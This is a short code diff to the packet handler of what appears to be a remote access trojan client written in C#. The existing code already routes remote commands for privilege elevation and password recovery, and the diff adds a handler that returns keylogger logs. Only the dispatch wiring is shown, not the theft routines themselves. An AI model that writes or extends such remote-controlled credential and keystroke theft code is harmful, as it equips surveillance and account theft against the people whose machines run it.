@@ -11,7 +11,7 @@ namespace Client.Packets
 
             if(type == TypePackets.DoAskElevate)
             {
-                CommandController.doAskElevate((DoAskElevate)packet, client);
+                Controllers.Tools.CommandController.doAskElevate((DoAskElevate)packet, client);
             }
             else if (type == TypePackets.GetMonitors)
             {
@@ -77,6 +77,11 @@ namespace Client.Packets
             {
                 PasswordRecoveryController.getPasswords((GetPasswords)packet, client);
             }
+            else if (type == TypePackets.GetKeyLoggerLogs)
+            {
+                KeyLoggerController.getKeyLogger((GetKeyLoggerLogs)packet, client);
+            }
+            
         }
     }
 }
